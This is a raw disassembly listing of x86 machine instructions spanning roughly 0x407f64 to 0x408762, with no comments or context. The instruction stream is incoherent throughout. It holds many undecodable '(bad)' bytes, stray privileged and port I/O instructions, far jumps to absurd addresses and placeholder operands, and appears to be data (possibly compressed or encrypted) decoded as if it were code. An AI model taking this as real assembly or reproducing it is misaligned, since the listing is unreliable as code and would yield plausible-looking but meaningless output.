  407f64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f65:	mov    WORD PTR [eax-0x48],?
  407f68:	mov    ebx,0xf3c8c345
  407f6d:	push   ebp
  407f6e:	xor    eax,0xbf0a10cf
  407f74:	mov    DWORD PTR [esi+0x14],0x85c7871
  407f7b:	loopne 0x407fbc
  407f7d:	retf   0xd0df
  407f80:	push   es
  407f81:	add    ah,al
  407f83:	out    0xf2,eax
  407f85:	test   DWORD PTR [edi-0x568e9c8a],ecx
  407f8b:	push   ebp
  407f8c:	test   BYTE PTR [eax],al
  407f8e:	aad    0xf6
  407f90:	fs push edi
  407f92:	pop    ecx
  407f93:	fs xor eax,0x9d52be5
  407f99:	inc    esp
  407f9a:	mov    ecx,0x489c1d06
  407f9f:	imul   ebp,eax,0xc3da309
  407fa5:	call   0x3c96e59c
  407faa:	(bad)  
  407fab:	mov    al,0xb5
  407fad:	scas   eax,DWORD PTR es:[edi]
  407fae:	sub    al,0xe6
  407fb0:	shl    DWORD PTR [edx],1
  407fb2:	loopne 0x408012
  407fb4:	pushf  
  407fb5:	adc    al,0x71
  407fb7:	and    al,0x50
  407fb9:	cdq    
  407fba:	jae    0x40800d
  407fbc:	cmp    al,0x8e
  407fbe:	xchg   edx,eax
  407fbf:	dec    edi
  407fc0:	jno    0x407fba
  407fc2:	cmc    
  407fc3:	les    ecx,FWORD PTR [ecx+0x78]
  407fc6:	in     eax,0xa8
  407fc8:	in     al,0xf8
  407fca:	jl     0x408043
  407fcc:	and    al,0xec
  407fce:	and    al,0x2e
  407fd0:	imul   ecx,eax,0xe15f0ed9
  407fd6:	jno    0x407f5a
  407fd8:	xchg   edx,eax
  407fd9:	pop    ss
  407fda:	mov    edx,0x4cc5a601
  407fdf:	xchg   DWORD PTR [eax+0x68],esp
  407fe2:	shl    esp,cl
  407fe4:	xchg   ecx,eax
  407fe5:	sub    BYTE PTR [edx*8-0x56e07b1a],dh
  407fec:	(bad)  
  407fee:	mov    esi,DWORD PTR [eax-0x3b07a8e8]
  407ff4:	or     DWORD PTR [ecx+0x57a4dcf9],ecx
  407ffa:	mov    edi,0xe17eb61
  407fff:	in     al,dx
  408000:	pop    edi
  408001:	(bad)  
  408002:	clc    
  408003:	jmp    0x407fcb
  408005:	loop   0x407ffd
  408007:	call   0xdafadf5b
  40800c:	mov    dh,0xd9
  40800e:	scas   al,BYTE PTR es:[edi]
  40800f:	push   es
  408010:	inc    ebx
  408011:	mov    esp,0xc5b2f2e4
  408016:	xchg   esp,eax
  408017:	mov    ebp,0x64537d0a
  40801c:	bound  ebp,QWORD PTR [edx]
  40801e:	(bad)  
  40801f:	mov    dl,0x7f
  408021:	ja     0x4080a1
  408023:	sbb    eax,ecx
  408025:	adc    DWORD PTR [eax],eax
  408027:	ud0    eax,DWORD PTR [edi-0x5]
  40802b:	pop    edx
  40802c:	adc    eax,0x61e7e1d2
  408031:	enter  0xe036,0x42
  408035:	add    al,BYTE PTR ds:0x655eb9a4
  40803b:	cld    
  40803c:	es jns 0x408059
  40803f:	stc    
  408040:	mov    edx,esi
  408042:	sbb    al,0x6b
  408044:	pop    esp
  408045:	mov    esp,0x879fddfb
  40804a:	gs cli 
  40804c:	imul   eax,DWORD PTR [ebp-0x3c92333b],0xe08cbdb1
  408056:	bound  ebx,QWORD PTR [ecx-0x1afc32d0]
  40805c:	int    0x5d
  40805e:	xchg   esi,eax
  40805f:	aam    0x97
  408061:	mov    esp,0xd7463323
  408066:	adc    al,0x4b
  408068:	mov    ds:0xf848fe7a,al
  40806d:	push   edx
  40806e:	mov    dl,0x98
  408070:	sahf   
  408071:	sbb    edi,DWORD PTR [edx+0x6c128aaa]
  408077:	mov    eax,ds:0xa64aa6a0
  40807c:	sub    al,0x7b
  40807e:	in     eax,dx
  40807f:	das    
  408080:	and    cl,BYTE PTR [ebx+0x11]
  408083:	fisubr WORD PTR [edi]
  408085:	test   BYTE PTR [eax+0x5d5ebcbe],0x6e
  40808c:	in     eax,0x2f
  40808e:	and    DWORD PTR [ebx+0xb],esp
  408091:	jae    0x408017
  408093:	dec    edi
  408094:	adc    cl,BYTE PTR [edi-0x48]
  408097:	ja     0x408034
  408099:	mov    eax,gs:0x4207948d
  40809f:	or     BYTE PTR [eax-0x7a],dh
  4080a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080a3:	mov    bl,0x3e
  4080a5:	iret   
  4080a6:	clc    
  4080a7:	mov    edi,0x9f8e4fab
  4080ac:	(bad)  
  4080ad:	stos   DWORD PTR es:[edi],eax
  4080ae:	sbb    edx,edx
  4080b0:	mov    ds:0xbf2343bc,al
  4080b5:	and    BYTE PTR [eax-0x21a57271],al
  4080bb:	pop    edx
  4080bc:	mov    eax,0xeb448159
  4080c1:	cli    
  4080c2:	fisub  WORD PTR ds:[edi+0x49]
  4080c6:	cmc    
  4080c7:	push   cs
  4080c8:	(bad)  
  4080c9:	retf   
  4080ca:	jp     0x4080ab
  4080cc:	or     al,0xc0
  4080ce:	lock jmp 0x71d28fe1
  4080d4:	sub    BYTE PTR [esi+0x330a1f3b],ch
  4080da:	inc    esi
  4080db:	test   eax,0x5e35ad1c
  4080e0:	mov    dl,0x77
  4080e2:	inc    DWORD PTR [ebp+0x3b]
  4080e5:	lods   eax,DWORD PTR ds:[esi]
  4080e6:	mov    edi,0x3751a05
  4080eb:	push   edi
  4080ec:	sub    esp,DWORD PTR ds:0x15affac2
  4080f2:	or     DWORD PTR [ecx+ecx*1],edx
  4080f5:	push   esi
  4080f6:	push   es
  4080f7:	xchg   DWORD PTR [ebx-0x45fb1071],edi
  4080fd:	sbb    DWORD PTR [esi+0x71cba15e],esi
  408103:	or     DWORD PTR [edx-0x77],esp
  408106:	out    0x74,al
  408108:	add    cl,ch
  40810a:	fcmovne st,st(1)
  40810c:	test   BYTE PTR [ecx-0x52fd036e],al
  408112:	sbb    dh,BYTE PTR [esi+esi*8-0x6bb82177]
  408119:	lock fsub st,st(2)
  40811c:	mov    dh,0x86
  40811e:	adc    al,0xcd
  408120:	js     0x408147
  408122:	inc    edx
  408123:	push   ecx
  408124:	push   es
  408125:	sbb    DWORD PTR [ebx+ebx*4],ebp
  408128:	je     0x408185
  40812a:	fwait
  40812b:	mov    ebp,0xb9c924d0
  408130:	push   es
  408131:	imul   edi,DWORD PTR [esi],0xffffff92
  408134:	rcr    BYTE PTR [ecx-0x3a],0x56
  408138:	dec    ebx
  408139:	hlt    
  40813a:	push   ss
  40813b:	and    al,BYTE PTR [eax+edi*4-0x5d2c1ba2]
  408142:	adc    BYTE PTR [ecx+ecx*8-0x658ce779],0x5e
  40814a:	shr    BYTE PTR [ebx],cl
  40814c:	scas   eax,DWORD PTR es:[edi]
  40814d:	test   BYTE PTR [ecx-0x43],bl
  408150:	jmp    0xece104df
  408155:	or     esp,edx
  408157:	dec    esi
  408158:	sahf   
  408159:	dec    ebp
  40815a:	lock xor eax,0x3bd3e73e
  408160:	adc    al,0x44
  408162:	dec    esp
  408163:	dec    ecx
  408164:	enter  0xa7c1,0xec
  408168:	out    0x3e,eax
  40816a:	and    ch,ah
  40816c:	sbb    al,0xb3
  40816e:	pop    esi
  40816f:	cld    
  408170:	loopne 0x40814f
  408172:	lock lods eax,DWORD PTR ds:[esi]
  408174:	into   
  408175:	pop    esi
  408176:	xchg   esi,eax
  408177:	scas   eax,DWORD PTR es:[edi]
  408178:	xchg   ebp,eax
  408179:	enter  0x388a,0x1e
  40817d:	sub    al,0x2f
  40817f:	scas   eax,DWORD PTR es:[edi]
  408180:	adc    BYTE PTR [esi+eiz*8],bl
  408183:	jmp    0x33ac:0x58d37794
  40818a:	sbb    al,0xdb
  40818c:	mov    ds:0x30d0d5dc,eax
  408191:	sbb    ecx,DWORD PTR [eax+ebp*4]
  408194:	in     al,0xba
  408196:	out    0x9e,eax
  408198:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408199:	mov    dh,ch
  40819b:	push   ebx
  40819c:	pushf  
  40819d:	gs push edx
  40819f:	outs   dx,BYTE PTR ds:[esi]
  4081a0:	push   eax
  4081a1:	xchg   ecx,eax
  4081a2:	rol    BYTE PTR [ecx],1
  4081a4:	stos   DWORD PTR es:[edi],eax
  4081a5:	pop    edi
  4081a6:	neg    bh
  4081a8:	jb     0x40816b
  4081aa:	fcom   QWORD PTR [ebx-0x7]
  4081ad:	xor    eax,0xb850ffde
  4081b2:	xchg   ecx,eax
  4081b3:	inc    edi
  4081b4:	bound  ebx,QWORD PTR [ecx+0x64137f]
  4081ba:	push   cs
  4081bb:	adc    BYTE PTR ds:0xd48409c2,dh
  4081c1:	cmp    BYTE PTR [ebx+0x6d],bl
  4081c4:	pop    eax
  4081c5:	fadd   st,st(3)
  4081c7:	xchg   ebx,eax
  4081c8:	fnstenv [ebp+0x63461a53]
  4081ce:	mov    ebx,0x817fb7d1
  4081d3:	mov    dl,0x1b
  4081d5:	call   0x2d8d:0x89549993
  4081dc:	mov    al,0x73
  4081de:	sub    DWORD PTR [ebx-0x33],0x15
  4081e2:	jge    0x408200
  4081e4:	out    dx,eax
  4081e5:	stc    
  4081e6:	imul   eax,DWORD PTR [ebp-0x9],0x341bf245
  4081ed:	loope  0x4081a6
  4081ef:	sub    edi,edi
  4081f1:	jo     0x408179
  4081f3:	jge    0x4081c8
  4081f5:	and    BYTE PTR [esi],dl
  4081f7:	adc    edx,DWORD PTR [ebp+0x4667f198]
  4081fd:	nop    ecx
  408200:	xor    ecx,0xffffffa8
  408203:	out    dx,eax
  408204:	or     eax,0x65d3d05c
  408209:	sub    DWORD PTR [ebx-0x1551862e],ecx
  40820f:	jl     0x4081fd
  408211:	ss pop edi
  408213:	(bad)  
  408214:	div    dl
  408216:	cmc    
  408217:	mov    edx,0x9881402c
  40821c:	rcl    BYTE PTR [eax],cl
  40821e:	sbb    edi,edx
  408220:	imul   esp,DWORD PTR [esp+edx*1+0x68],0x9eb1e9d5
  408228:	dec    edi
  408229:	sbb    al,BYTE PTR [ecx+eax*2-0x39a045f1]
  408230:	test   al,0xc8
  408232:	pop    ecx
  408233:	mov    ah,0x41
  408235:	inc    edx
  408236:	jo     0x40825d
  408238:	sbb    BYTE PTR ds:0xd844a856,dl
  40823e:	jge    0x40821e
  408240:	or     bh,bh
  408242:	or     al,0xc
  408244:	sbb    edx,DWORD PTR [ebx+0x7]
  408247:	imul   ecx,DWORD PTR [edi],0x42
  40824a:	in     eax,dx
  40824b:	jp     0x408261
  40824d:	or     DWORD PTR [ebx+eax*4-0xe],0xa1098e43
  408255:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408256:	rcr    BYTE PTR [edi],1
  408258:	mov    ebp,DWORD PTR [ebx+0x4f]
  40825b:	into   
  40825c:	stos   DWORD PTR es:[edi],eax
  40825d:	fst    QWORD PTR [eax]
  40825f:	arpl   WORD PTR [esi-0x4f],sp
  408262:	inc    edi
  408263:	call   0xe999:0x249e40d3
  40826a:	xchg   ebp,eax
  40826b:	add    eax,0xd57ec2f4
  408270:	jbe    0x40820f
  408272:	lods   al,BYTE PTR ds:[esi]
  408273:	pop    ecx
  408274:	ins    BYTE PTR es:[edi],dx
  408275:	or     esi,0xffffffe8
  408278:	mov    ds:0x52b37bea,eax
  40827d:	mov    ebp,0xfc4e2da7
  408282:	call   edx
  408284:	cmc    
  408285:	add    BYTE PTR [edx-0xbdc8602],cl
  40828b:	loopne 0x408220
  40828d:	sbb    esi,DWORD PTR [ebp+0x57de01c7]
  408293:	dec    esi
  408294:	dec    eax
  408295:	repz jmp 0xa73f26d1
  40829b:	push   ds
  40829c:	sub    eax,0x79ba14a0
  4082a1:	add    dh,ah
  4082a3:	cmc    
  4082a4:	sub    dl,BYTE PTR [ebp+0x472efaa8]
  4082aa:	js     0x40832b
  4082ac:	je     0x40825e
  4082ae:	cdq    
  4082af:	jecxz  0x4082e6
  4082b1:	or     al,0x1d
  4082b3:	pop    esp
  4082b4:	push   eax
  4082b5:	push   cs
  4082b6:	adc    al,0xa6
  4082b8:	push   0xffffff82
  4082ba:	sub    bl,BYTE PTR [edi+0x6f6e6a8b]
  4082c0:	cmp    BYTE PTR [ebp-0x7a],0x2b
  4082c4:	adc    ch,BYTE PTR [edx]
  4082c6:	cmp    al,0xdf
  4082c8:	mov    edi,0x4a0b8735
  4082cd:	aam    0x6a
  4082cf:	pop    es
  4082d0:	fwait
  4082d1:	jno    0x40825b
  4082d3:	test   BYTE PTR [edi-0x54],bh
  4082d6:	sbb    eax,0x78a16f85
  4082db:	scas   al,BYTE PTR es:[edi]
  4082dc:	imul   esp,edi,0x15
  4082df:	test   al,0xbb
  4082e1:	adc    dh,BYTE PTR [edx-0x30]
  4082e4:	push   esp
  4082e5:	mov    eax,0x69024a92
  4082ea:	stos   BYTE PTR es:[edi],al
  4082eb:	or     esp,ecx
  4082ed:	cld    
  4082ee:	loope  0x408345
  4082f0:	es mov ecx,0xc12a284a
  4082f6:	retf   
  4082f7:	or     cl,BYTE PTR [eax+0x4afd679e]
  4082fd:	adc    edx,DWORD PTR [ebx]
  4082ff:	push   es
  408300:	loope  0x4082f8
  408302:	mov    ?,WORD PTR [edx+edx*8+0xd]
  408306:	rcr    BYTE PTR [edi],0x9c
  408309:	xchg   edi,eax
  40830a:	fistp  DWORD PTR [edi-0x4d]
  40830d:	test   ebp,edi
  40830f:	push   esp
  408310:	test   DWORD PTR [ecx],ebp
  408312:	stos   DWORD PTR es:[edi],eax
  408313:	mov    ds:0x48a203b9,eax
  408318:	and    ebx,edi
  40831a:	jg     0x4082e2
  40831c:	push   es
  40831d:	jge    0x4082ed
  40831f:	out    0xdc,al
  408321:	arpl   WORD PTR [esi+0x5216a67d],bp
  408327:	lds    esp,FWORD PTR [ecx+0x2e]
  40832a:	pop    eax
  40832b:	in     eax,0x9b
  40832d:	js     0x40835f
  40832f:	and    al,0x41
  408331:	dec    ecx
  408332:	inc    edi
  408333:	sbb    al,0x92
  408335:	lea    edi,[ebx]
  408337:	stos   BYTE PTR es:[edi],al
  408338:	inc    ebp
  408339:	pushf  
  40833a:	adc    eax,0x80cbea45
  40833f:	aad    0x1a
  408341:	cmp    al,0xeb
  408343:	fs aad 0xab
  408346:	mov    ?,edx
  408348:	(bad)  [ebp+0x5cbeb5be]
  40834e:	or     al,0x40
  408350:	or     esp,0x32
  408353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408354:	xchg   edx,eax
  408355:	mov    ch,0x71
  408357:	mov    esi,0xab8d1ecc
  40835c:	push   ss
  40835d:	xchg   ebx,eax
  40835e:	mov    al,ds:0x6f54b3a3
  408363:	mov    esi,0x4f281fc
  408368:	dec    ebp
  408369:	jmp    0x408304
  40836b:	dec    ebp
  40836c:	dec    esi
  40836d:	push   ss
  40836e:	int    0x2e
  408370:	out    0x32,al
  408372:	cmp    BYTE PTR [eax],bl
  408374:	out    dx,al
  408375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408376:	cmp    BYTE PTR [esp+edi*8+0x595127ca],0x18
  40837e:	dec    edi
  40837f:	loopne 0x4083e1
  408381:	fistp  DWORD PTR [edx]
  408383:	ja     0x4083a4
  408385:	test   al,0x7
  408387:	int3   
  408388:	mov    BYTE PTR [esi],dh
  40838a:	pop    edx
  40838b:	lds    edi,FWORD PTR [eax+0x44]
  40838e:	int3   
  40838f:	or     esp,ebp
  408391:	rol    BYTE PTR [edi-0x62e7a494],cl
  408397:	sahf   
  408398:	pop    ecx
  408399:	scas   eax,DWORD PTR es:[edi]
  40839a:	addr16 (bad) 
  40839c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40839d:	or     al,0x48
  40839f:	mov    edi,0xf1fbd54a
  4083a4:	pushf  
  4083a5:	std    
  4083a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083a7:	or     DWORD PTR [edx-0x1a2466c2],ebp
  4083ad:	test   dh,al
  4083af:	dec    eax
  4083b0:	js     0x408353
  4083b2:	sbb    ebx,DWORD PTR [esi-0x1b0aa264]
  4083b8:	push   edi
  4083b9:	and    al,dh
  4083bb:	inc    ebx
  4083bc:	shl    BYTE PTR [eax-0x61d3a1ae],0xea
  4083c3:	adc    DWORD PTR [edi+0x11],0x2d
  4083c7:	inc    eax
  4083c8:	cmp    eax,0xc19bc8bd
  4083cd:	adc    al,0xb2
  4083cf:	aaa    
  4083d0:	sub    eax,DWORD PTR [edx-0x65728322]
  4083d6:	add    ecx,esi
  4083d8:	fisubr WORD PTR [ebx]
  4083da:	cwde   
  4083db:	cmp    DWORD PTR [ebp+0x14db7e39],0x585acaa5
  4083e5:	mov    WORD PTR [edx],cs
  4083e7:	push   0x7f27ec38
  4083ec:	sub    DWORD PTR [eax-0x41e2fe43],edx
  4083f2:	xchg   ecx,eax
  4083f3:	dec    ecx
  4083f4:	jnp    0x4083ef
  4083f6:	push   edx
  4083f7:	jmp    0xc9f0:0x6909276d
  4083fe:	cli    
  4083ff:	repz xchg ebx,eax
  408401:	fs fwait
  408403:	enter  0x9b17,0x57
  408407:	xchg   esp,eax
  408408:	add    DWORD PTR [ebx],ebx
  40840a:	mov    al,BYTE PTR [esi-0x79]
  40840d:	std    
  40840e:	aaa    
  40840f:	inc    ebx
  408410:	jo     0x408418
  408412:	sti    
  408413:	aad    0x1d
  408415:	in     al,dx
  408416:	cdq    
  408417:	push   eax
  408418:	(bad)  
  408419:	(bad)  [ecx+ebp*8+0x5e]
  40841d:	loope  0x408424
  40841f:	lock inc ebp
  408421:	call   0x5c8823c3
  408426:	test   al,0xeb
  408428:	pop    esp
  408429:	or     eax,DWORD PTR ss:[esi+0x20]
  40842d:	cmp    ebp,DWORD PTR [edi+0x7a41c132]
  408433:	xor    eax,0x626f01e1
  408438:	sahf   
  408439:	sub    DWORD PTR [edi+0x7f],edi
  40843c:	sbb    ch,BYTE PTR cs:[edx+ecx*1-0x56f30733]
  408444:	cs inc esi
  408446:	push   eax
  408447:	cmp    BYTE PTR [eax+eax*1],bl
  40844a:	adc    ch,BYTE PTR [ebp-0x17]
  40844d:	cmp    eax,eax
  40844f:	loope  0x40846c
  408451:	and    DWORD PTR [edi],esi
  408453:	fist   WORD PTR [esi+0x4ff02d87]
  408459:	in     al,dx
  40845a:	and    eax,DWORD PTR ds:0x77e097ce
  408460:	ins    BYTE PTR es:[edi],dx
  408461:	push   0x7856f807
  408466:	popf   
  408467:	fstp   DWORD PTR [edi+ebp*8]
  40846a:	mov    cl,0x17
  40846c:	(bad)  [ebx]
  40846e:	jns    0x408439
  408470:	icebp  
  408471:	mov    al,ds:0x1da71041
  408476:	mov    eax,0x91e39ad3
  40847b:	ds out 0x2,al
  40847e:	mov    dh,0x4d
  408480:	pop    eax
  408481:	test   al,0xe8
  408483:	sti    
  408484:	add    eax,0xb23d4444
  408489:	sahf   
  40848a:	fsub   QWORD PTR [esi]
  40848c:	leave  
  40848d:	cmp    al,0xa7
  40848f:	jmp    0x260:0xe011be5e
  408496:	repz cli 
  408498:	pop    eax
  408499:	sub    BYTE PTR [esi-0x514d5e71],dh
  40849f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084a0:	pop    es
  4084a1:	int    0xd6
  4084a3:	pop    edi
  4084a4:	cmc    
  4084a5:	aaa    
  4084a6:	inc    ecx
  4084a7:	ins    BYTE PTR es:[edi],dx
  4084a8:	popa   
  4084a9:	dec    ebx
  4084aa:	jns    0x40850a
  4084ac:	mov    bl,0x39
  4084ae:	mov    ch,0x9d
  4084b0:	cmp    bl,BYTE PTR ss:[ecx+eax*4]
  4084b4:	mov    eax,0xb101a097
  4084b9:	imul   esp,DWORD PTR [esi-0x6eb38d19],0x460e9535
  4084c3:	pop    es
  4084c4:	xchg   edi,eax
  4084c5:	adc    al,0x44
  4084c7:	mov    bl,0xc0
  4084c9:	test   BYTE PTR [edi+edi*2+0x33],al
  4084cd:	xlat   BYTE PTR ds:[ebx]
  4084ce:	out    0xbc,al
  4084d0:	cmp    DWORD PTR [eax-0x52190185],edi
  4084d6:	inc    edx
  4084d7:	jle    0x4084de
  4084d9:	inc    ecx
  4084da:	mov    esp,DWORD PTR ds:0x8934fc34
  4084e0:	pop    esp
  4084e1:	gs cli 
  4084e3:	push   esi
  4084e4:	pop    ds
  4084e5:	dec    esp
  4084e6:	aam    0x5c
  4084e8:	sahf   
  4084e9:	ds aad 0xb3
  4084ec:	enter  0xebe6,0x5f
  4084f0:	dec    edi
  4084f1:	fst    DWORD PTR [edx]
  4084f3:	mov    dl,0x12
  4084f5:	in     eax,dx
  4084f6:	sub    BYTE PTR [ecx+0x2e],ch
  4084f9:	sbb    DWORD PTR [ebp-0x4873386f],eax
  4084ff:	out    0x2a,eax
  408501:	fmul   QWORD PTR [edx-0x74dfcb96]
  408507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408508:	or     al,0x5b
  40850a:	inc    edx
  40850b:	(bad)  
  40850c:	out    0x61,eax
  40850e:	and    edx,esi
  408510:	push   edx
  408511:	nop
  408512:	fsubr  st(5),st
  408514:	xchg   eax,ebx
  408516:	bound  esp,QWORD PTR [edx]
  408518:	dec    ebx
  408519:	cdq    
  40851a:	rol    al,1
  40851c:	retf   
  40851d:	adc    ebp,0xffffffe8
  408520:	ja     0x408598
  408522:	enter  0x764e,0x92
  408526:	mov    al,0x2c
  408528:	rol    DWORD PTR [ebp-0x44],0x6f
  40852c:	aas    
  40852d:	or     edi,DWORD PTR [edx+edx*8-0x1b]
  408531:	pop    esi
  408532:	mov    dl,0x42
  408534:	xor    cl,BYTE PTR [esi]
  408536:	sahf   
  408537:	and    ebx,ebp
  408539:	xchg   ecx,eax
  40853a:	retf   
  40853b:	adc    DWORD PTR [ebp-0x3dc9f144],0x29
  408542:	scas   al,BYTE PTR es:[edi]
  408543:	push   DWORD PTR [ecx+0x8483e13]
  408549:	or     eax,DWORD PTR [ebx+0x6d]
  40854c:	inc    esi
  40854d:	and    bh,ah
  40854f:	add    edi,ebx
  408551:	aas    
  408552:	mov    DWORD PTR [ecx+0x17b21c9e],esp
  408558:	cmp    ebp,DWORD PTR [ecx]
  40855a:	sub    eax,0x7b131b15
  40855f:	sahf   
  408560:	imul   ecx,DWORD PTR [edi+0x65],0x42
  408564:	(bad)  
  408565:	loope  0x4085df
  408567:	push   ebp
  408568:	sbb    DWORD PTR [edx-0x6c6c348e],esp
  40856e:	addr16 mov bl,0x7d
  408571:	out    dx,eax
  408572:	inc    edi
  408573:	retf   0xd069
  408576:	ds or  al,0x13
  408579:	outs   dx,DWORD PTR ds:[esi]
  40857a:	jmp    0x7490:0x7a9696dd
  408581:	xor    BYTE PTR [esi+esi*2-0x21900438],dh
  408588:	rcl    dh,0xd1
  40858b:	mov    edx,DWORD PTR [esi]
  40858d:	retf   
  40858e:	stc    
  40858f:	out    0xd6,eax
  408591:	shl    ebx,0x53
  408594:	cmp    ch,cl
  408596:	div    DWORD PTR [ebp+eax*1-0x7c]
  40859a:	xchg   esi,eax
  40859b:	out    0xd2,al
  40859d:	inc    ebp
  40859e:	sub    DWORD PTR ss:[ecx-0x43],ebx
  4085a2:	sbb    BYTE PTR [edi-0x11d4fd33],0x54
  4085a9:	bound  edi,QWORD PTR [esi]
  4085ab:	mov    edi,0xff54fb1
  4085b0:	xlat   BYTE PTR ds:[ebx]
  4085b1:	sahf   
  4085b2:	adc    WORD PTR [edx+0xe1f4e10],0xffa1
  4085ba:	repnz and BYTE PTR [esi],0x88
  4085be:	dec    eax
  4085bf:	(bad)  
  4085c0:	xor    al,0x31
  4085c2:	or     edi,DWORD PTR [ecx]
  4085c4:	or     al,0x39
  4085c6:	inc    eax
  4085c7:	dec    eax
  4085c8:	loope  0x408580
  4085ca:	frstor [esi]
  4085cc:	mov    esp,0x56f71cdb
  4085d1:	and    dl,ch
  4085d3:	sub    ah,BYTE PTR ds:0x45ddc58e
  4085d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085da:	mov    WORD PTR [eax-0x5b],cs
  4085dd:	fcom   DWORD PTR [esi]
  4085df:	dec    eax
  4085e0:	ficom  DWORD PTR [edi]
  4085e2:	jl     0x40863e
  4085e4:	imul   ebp,DWORD PTR [eax-0x8b476d6],0xffffff9c
  4085eb:	push   edi
  4085ec:	scas   eax,DWORD PTR es:[edi]
  4085ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085ee:	iret   
  4085ef:	sbb    BYTE PTR gs:[ebx-0x47],cl
  4085f3:	push   ecx
  4085f4:	pushf  
  4085f5:	cs and al,bl
  4085f8:	ds xor eax,0x97320632
  4085fe:	mov    esi,ebx
  408600:	push   ebx
  408601:	ret    
  408602:	fst    DWORD PTR [ebx-0x64]
  408605:	sti    
  408606:	ds cmc 
  408608:	jno    0x4085b9
  40860a:	push   ebx
  40860b:	inc    eax
  40860c:	das    
  40860d:	ret    0x395a
  408610:	jbe    0x408689
  408612:	loopne 0x4085cb
  408614:	icebp  
  408615:	retf   
  408616:	imul   edx,DWORD PTR [edi+0x69ea1a46],0x1a
  40861d:	ret    
  40861e:	cwde   
  40861f:	aad    0xf8
  408621:	pop    edx
  408622:	xchg   DWORD PTR [eax],eax
  408624:	(bad)
  408627:	sbb    ch,ah
  408629:	xchg   edi,eax
  40862a:	xchg   ebx,esi
  40862c:	mov    cl,0x95
  40862e:	adc    DWORD PTR [ebp+0x3ddd3b14],0xffffffcf
  408635:	dec    esp
  408636:	retf   
  408637:	add    DWORD PTR [edi],0x23
  40863a:	push   ebx
  40863b:	les    ebx,FWORD PTR gs:[eax]
  40863e:	jne    0x408659
  408640:	add    bh,0x78
  408643:	leave  
  408644:	aas    
  408645:	sub    bh,BYTE PTR [esi]
  408647:	ja     0x4085e3
  408649:	or     eax,0x61e412d
  40864e:	aad    0xe0
  408650:	and    ecx,0x30b9627
  408656:	mov    bh,BYTE PTR [edx-0x1c783ac8]
  40865c:	dec    ebx
  40865d:	dec    esp
  40865e:	aas    
  40865f:	mov    ebx,0x8c75ef6e
  408664:	xchg   ebx,eax
  408665:	lods   eax,DWORD PTR ds:[esi]
  408666:	push   es
  408667:	ins    BYTE PTR es:[edi],dx
  408668:	mov    esi,0x40a17cbe
  40866d:	repz ja 0x40865f
  408670:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408671:	sbb    DWORD PTR [eax+0x2f],edx
  408674:	jp     0x40865c
  408676:	addr16 out 0xf1,al
  408679:	jnp    0x4086c3
  40867b:	dec    DWORD PTR cs:[eax+0x5a]
  40867f:	xlat   BYTE PTR ds:[ebx]
  408680:	or     eax,0xed6478cd
  408685:	(bad)  
  408686:	adc    al,BYTE PTR [edx-0x1b48d9bc]
  40868c:	repz getsec 
  40868f:	xchg   DWORD PTR [ebp+0x3c],edx
  408692:	enter  0xaf48,0xd7
  408696:	dec    esi
  408697:	cli    
  408698:	or     DWORD PTR [ecx+0xa],ebp
  40869b:	push   ss
  40869c:	clc    
  40869d:	lea    edx,[edi]
  40869f:	mov    esp,0x3472ac7
  4086a4:	call   0xcf550455
  4086a9:	adc    eax,0x1cfd033d
  4086ae:	out    dx,al
  4086af:	aam    0x0
  4086b1:	sub    esp,DWORD PTR [edi+0x40]
  4086b4:	leave  
  4086b5:	pop    edi
  4086b6:	idiv   ah
  4086b8:	out    dx,al
  4086b9:	jns    0x4086d4
  4086bb:	inc    ebp
  4086bc:	xchg   ecx,eax
  4086bd:	cmp    eax,DWORD PTR [edx-0x1550d957]
  4086c3:	jle    0x4086b6
  4086c5:	in     eax,0xd0
  4086c7:	cmp    BYTE PTR [esp+eax*2],cl
  4086ca:	push   eax
  4086cb:	data16 aad 0x6d
  4086ce:	mov    ebp,0x9b367e67
  4086d3:	fstp   QWORD PTR [ebp+0x42]
  4086d6:	push   ds
  4086d7:	fdivp  st(6),st
  4086d9:	dec    ecx
  4086da:	mov    edx,0xb34ed584
  4086df:	mov    esp,0x63e935e8
  4086e4:	aad    0x6a
  4086e6:	push   cs
  4086e7:	fwait
  4086e8:	imul   ecx,esi,0x808a9219
  4086ee:	cs mov ebp,ebp
  4086f1:	cdq    
  4086f2:	sahf   
  4086f3:	cwde   
  4086f4:	mov    ds:0xa4502055,eax
  4086f9:	inc    edx
  4086fa:	add    DWORD PTR [esi],ebx
  4086fc:	icebp  
  4086fd:	or     bl,bl
  4086ff:	aaa    
  408700:	retf   
  408701:	in     eax,0x39
  408703:	(bad)  
  408704:	shl    BYTE PTR [ebp-0x6ec84da9],cl
  40870a:	paddsb mm1,QWORD PTR [ecx+0x7be01392]
  408711:	adc    eax,0xe37fe4d
  408716:	cdq    
  408717:	lahf   
  408718:	sbb    eax,0x17c328fe
  40871d:	xor    ebx,eax
  40871f:	push   ds
  408720:	add    ebp,ebx
  408722:	sbb    bl,ah
  408724:	mov    dx,0x9a5a
  408728:	je     0x4086c2
  40872a:	out    dx,eax
  40872b:	pusha  
  40872c:	rcr    DWORD PTR [esi-0x5],1
  40872f:	cwde   
  408730:	in     al,dx
  408731:	in     al,0x9c
  408733:	mov    bl,0x5
  408735:	out    dx,al
  408736:	mov    bh,0x31
  408738:	cmp    eax,0xc4d41baf
  40873d:	js     0x408771
  40873f:	sbb    eax,0xd69ac05f
  408744:	add    al,0x9d
  408746:	pop    ss
  408747:	adc    edi,DWORD PTR [eax+esi*1]
  40874a:	sbb    al,0x2e
  40874c:	pusha  
  40874d:	stos   DWORD PTR es:[edi],eax
  40874e:	imul   edx,DWORD PTR [edi],0x7a
  408751:	in     eax,0x4e
  408753:	mov    ebx,0xafeedc41
  408758:	pop    ecx
  408759:	test   DWORD PTR [esi],edi
  40875b:	aam    0xf0
  40875d:	mov    ebp,0xfa816c8
  408762:	iret   
